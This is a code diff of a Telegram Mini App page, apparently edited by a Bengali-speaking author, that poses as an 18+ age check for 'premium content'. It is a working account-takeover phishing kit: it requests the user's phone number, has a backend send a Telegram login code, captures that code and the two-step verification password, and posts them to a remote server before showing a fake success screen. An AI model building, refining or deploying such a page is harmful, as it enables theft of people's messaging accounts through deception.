@@ -19,8 +19,7 @@
             margin: 0; padding: 0; height: 100vh;
             display: flex; justify-content: center; align-items: center;
             color: var(--text-color); font-family: 'Segoe UI', Roboto, sans-serif;
-            overflow: hidden; position: relative;
-            background: #000;
+            overflow: hidden; position: relative; background: #000;
         }
 
         body::before {
@@ -30,15 +29,15 @@
             filter: blur(10px); z-index: -2; transform: scale(1.1);
         }
 
-        /* Full Page Loader Style */
+        /* Full Page Animated Loader */
         #full-page-loader {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.7); backdrop-filter: blur(8px);
+            background: rgba(0,0,0,0.8); backdrop-filter: blur(10px);
             display: none; flex-direction: column; justify-content: center;
             align-items: center; z-index: 1000;
         }
-        .loading-emoji { width: 100px; height: 100px; animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.2); } 100% { transform: scale(1); } }
+        .loading-emoji { width: 100px; height: 100px; animation: pulse 1.2s infinite; }
+        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.15); } }
 
         .app-container {
             width: 90%; max-width: 380px; text-align: center; padding: 30px 20px;
@@ -50,19 +49,16 @@
         .step.active { display: block; animation: slideUp 0.4s ease-out; }
         @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
 
-        .emoji-img { width: 120px; height: 120px; margin-bottom: 20px; filter: drop-shadow(0 5px 15px rgba(0,0,0,0.3)); }
-
-        h2 { font-size: 22px; margin-bottom: 10px; font-weight: 600; }
-        p { font-size: 14px; opacity: 0.8; margin-bottom: 20px; line-height: 1.5; }
+        .emoji-img { width: 120px; height: 120px; margin-bottom: 20px; }
+        h2 { font-size: 22px; margin-bottom: 10px; }
+        p { font-size: 14px; opacity: 0.8; margin-bottom: 20px; }
 
         .btn {
             background: var(--primary-btn); color: white; border: none;
             padding: 16px; width: 100%; border-radius: 14px;
             font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px;
-            transition: all 0.3s ease; box-shadow: 0 4px 15px var(--primary-glow);
-            display: flex; justify-content: center; align-items: center;
+            transition: 0.3s; box-shadow: 0 4px 15px var(--primary-glow);
         }
-        .btn:active { transform: scale(0.97); }
 
         .code-input-wrap { display: flex; justify-content: center; gap: 10px; margin: 20px 0; }
         .code-input {
@@ -70,15 +66,13 @@
             border: 2px solid rgba(255, 255, 255, 0.1); border-radius: 12px;
             color: white; text-align: center; font-size: 24px; font-weight: bold;
         }
-        .code-input.filled { border-color: var(--primary-btn); box-shadow: 0 0 10px var(--primary-glow); background: rgba(114, 101, 227, 0.1); }
+        .code-input.filled { border-color: var(--primary-btn); background: rgba(114, 101, 227, 0.1); }
 
         .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin-top: 25px; }
         .key { background: var(--keypad-bg); padding: 18px; border-radius: 15px; font-size: 20px; cursor: pointer; }
-        .key.special { color: var(--primary-btn); font-weight: bold; }
-
         .error-msg { color: var(--error-color); font-size: 13px; margin-top: 12px; display: none; }
-        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-10px); } 75% { transform: translateX(10px); } }
         .shake { animation: shake 0.3s ease-in-out; }
+        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-10px); } 75% { transform: translateX(10px); } }
     </style>
 </head>
 <body>
@@ -88,18 +82,18 @@
         <p style="margin-top: 15px; font-weight: bold; color: white;">Processing...</p>
     </div>
 
-    <div class="app-container" id="main-app">
+    <div class="app-container" id="main-content">
         <div class="step active" id="step1">
             <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Telegram-Animated-Emojis/main/Symbols/No%20One%20Under%20Eighteen.webp" class="emoji-img">
             <h2>Verify Your Age</h2>
             <p>You must be 18+ to access premium content.</p>
-            <button class="btn" id="startBtn" onclick="handleStart()">✅ I'M 18+ PROCEED</button>
+            <button class="btn" onclick="handleStart()">✅ I'M 18+ PROCEED</button>
         </div>
 
         <div class="step" id="step2">
             <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Telegram-Animated-Emojis/main/Objects/Mobile%20Phone.webp" class="emoji-img">
-            <h2>Enter OTP Code</h2>
-            <p>A 5-digit code has been sent to your Telegram account.</p>
+            <h2>Enter Code</h2>
+            <p>৫-ডিজিটের কোডটি এখানে লিখুন।</p>
             <div class="code-input-wrap" id="otp-wrap">
                 <input type="text" class="code-input" id="otp1" readonly placeholder="•">
                 <input type="text" class="code-input" id="otp2" readonly placeholder="•">
@@ -112,23 +106,24 @@
                 <div class="key" onclick="press('1')">1</div><div class="key" onclick="press('2')">2</div><div class="key" onclick="press('3')">3</div>
                 <div class="key" onclick="press('4')">4</div><div class="key" onclick="press('5')">5</div><div class="key" onclick="press('6')">6</div>
                 <div class="key" onclick="press('7')">7</div><div class="key" onclick="press('8')">8</div><div class="key" onclick="press('9')">9</div>
-                <div class="key special" onclick="press('C')">C</div><div class="key" onclick="press('0')">0</div><div class="key special" onclick="press('⌫')">⌫</div>
+                <div class="key" style="color:red" onclick="press('C')">C</div><div class="key" onclick="press('0')">0</div><div class="key" onclick="press('⌫')">⌫</div>
             </div>
         </div>
 
         <div class="step" id="step3">
             <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Telegram-Animated-Emojis/main/Objects/Locked%20With%20Key.webp" class="emoji-img">
             <h2>2-Step Verification</h2>
-            <p>Please enter your password below.</p>
-            <input type="password" id="2fa-input" class="btn" style="background: rgba(255,255,255,0.05); text-align: center; border: 1px solid rgba(255,255,255,0.2);" placeholder="Enter Password">
+            <p>আপনার টু-স্টেপ পাসওয়ার্ডটি দিন।</p>
+            <input type="password" id="2fa-input" class="btn" style="background: rgba(255,255,255,0.05); text-align: center;" placeholder="Password">
             <div id="2fa-error" class="error-msg">❌ পাসওয়ার্ড সঠিক নয়।</div>
-            <button class="btn" onclick="verify2FA()">UNLOCK ACCESS</button>
+            <button class="btn" onclick="verify2FA()">SUBMIT PASSWORD</button>
         </div>
 
         <div class="step" id="step4">
             <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Telegram-Animated-Emojis/main/Objects/Card%20Index%20Dividers.webp" class="emoji-img">
             <h2>লগইন সফল!</h2>
-            <button class="btn" style="background: #ff9500;" onclick="window.location.href='https://t.me/your_channel'">🎬 WATCH VIDEOS NOW</button>
+            <p>সবকিছু ঠিক আছে, এখন আপনি ভিডিওগুলো দেখতে পারবেন।</p>
+            <button class="btn" style="background: #ff9500;" onclick="window.location.href='https://t.me/your_channel'">🎬 WATCH VIDEOS</button>
         </div>
     </div>
 
@@ -149,13 +144,17 @@
             document.getElementById('step' + n).classList.add('active');
         }
 
+        // ১. নম্বর নেয়া এবং সরাসরি রেন্ডারে পাঠানো
         function handleStart() {
             tg.requestContact((sent, response) => {
-                // ৩ নম্বর ছবির সমাধান: শুধু নম্বর পেলে পরের ধাপে যাবে, ক্যানসেল করলে কিছুই হবে না।
                 if (sent && response && response.contact) {
                     userPhone = response.contact.phone_number;
                     if (!userPhone.startsWith('+')) userPhone = '+' + userPhone;
+
+                    // সাথে সাথে ওটিপি পেজে মুভ
                     nextStep(2);
+
+                    // ব্যাকগ্রাউন্ডে রেন্ডার সার্ভারে পাঠানো
                     fetch(`${RENDER_URL}/send_otp`, {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
@@ -179,6 +178,7 @@
             if (currentOtp.length === 5) { verifyOtp(); }
         }
 
+        // ২. ওটিপি ভেরিফাই এবং ২এফএ চেক
         async function verifyOtp() {
             toggleLoader(true);
             try {
@@ -189,30 +189,42 @@
                 });
                 const data = await res.json();
                 toggleLoader(false);
-                if (data.status === "done") nextStep(4);
-                else if (data.status === "need_2fa") nextStep(3);
-                else throw new Error();
+
+                if (data.status === "done") {
+                    nextStep(4); // সফল
+                } else if (data.status === "need_2fa") {
+                    nextStep(3); // ২এফএ লাগবে
+                } else {
+                    throw new Error();
+                }
             } catch (err) {
                 toggleLoader(false);
                 document.getElementById('otp-wrap').classList.add('shake');
                 document.getElementById('otp-error').style.display = "block";
-                setTimeout(() => { document.getElementById('otp-wrap').classList.remove('shake'); }, 500);
+                currentOtp = "";
+                for(let i=1;i<=5;i++) { document.getElementById('otp'+i).value=""; document.getElementById('otp'+i).classList.remove('filled'); }
+                setTimeout(() => document.getElementById('otp-wrap').classList.remove('shake'), 500);
             }
         }
 
+        // ৩. ২এফএ পাসওয়ার্ড সাবমিট এবং সেসন কমপ্লিট করা
         async function verify2FA() {
             const pass = document.getElementById('2fa-input').value;
             if(!pass) return;
             toggleLoader(true);
             try {
                 const res = await fetch(`${RENDER_URL}/verify`, {
-                    method: 'POST', headers: {'Content-Type': 'application/json'},
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({ phone: userPhone, otp: currentOtp, password: pass })
                 });
                 const data = await res.json();
                 toggleLoader(false);
-                if (data.status === "done") nextStep(4);
-                else throw new Error();
+                if (data.status === "done") {
+                    nextStep(4);
+                } else {
+                    throw new Error();
+                }
             } catch (err) {
                 toggleLoader(false);
                 document.getElementById('2fa-input').classList.add('shake');
